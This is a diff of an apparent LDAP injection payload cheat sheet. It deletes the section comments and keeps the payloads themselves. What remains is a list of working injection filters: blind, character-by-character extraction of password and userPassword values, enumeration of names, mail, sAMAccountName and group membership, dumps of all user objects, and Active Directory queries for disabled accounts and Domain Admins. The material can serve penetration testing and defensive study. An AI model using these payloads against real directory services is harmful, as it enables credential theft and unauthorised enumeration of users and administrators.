@@ -1,40 +1,24 @@
-# ============================================================
-# LDAP Injection — Blind / Out-of-Band Extraction
-# ============================================================
-
-# ---- Boolean-Based Blind ----
-# True: valid user logged in or attribute matched
-# False: login failed or attribute not matched
-
-# Extract first character of password (char by char):
 user*)(|(password=a*)
 user*)(|(password=b*)
 user*)(|(password=c*)
 ...
 user*)(|(password=z*)
 
-# Extract by position (if wildcard supported):
 user*)(|(password=a???????*)
 user*)(|(password=?a??????*)
 
-# ---- Password Extraction via Wildcards ----
 *)(|(userPassword=a*)
 *)(|(userPassword=b*)
 *)(|(userPassword=c*)
-# Continue through alphabet; match = first char found
 
-# ---- Attribute Enumeration ----
 *)(|(cn=a*)
 *)(|(cn=b*)
 *)(|(mail=a*)
 *)(|(sAMAccountName=a*)
 *)(|(memberOf=CN=a*)
 
-# ---- OOB via DNS (if LDAP server makes external queries) ----
 *)(|(cn=*
-# Combine with DNS rebinding or SSRF-like primitives
 
-# ---- Extract All Users ----
 *(|(objectClass=user)(objectClass=person)(objectClass=inetOrgPerson))
 *(objectClass=*)
 *(|(objectClass=*))
@@ -42,7 +26,6 @@ user*)(|(password=?a??????*)
 *(uid=*)
 *(mail=*)
 
-# ---- Active Directory Specific ----
 *(sAMAccountType=805306368)
 *(userAccountControl:1.2.840.113556.1.4.803:=2)
 *(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)
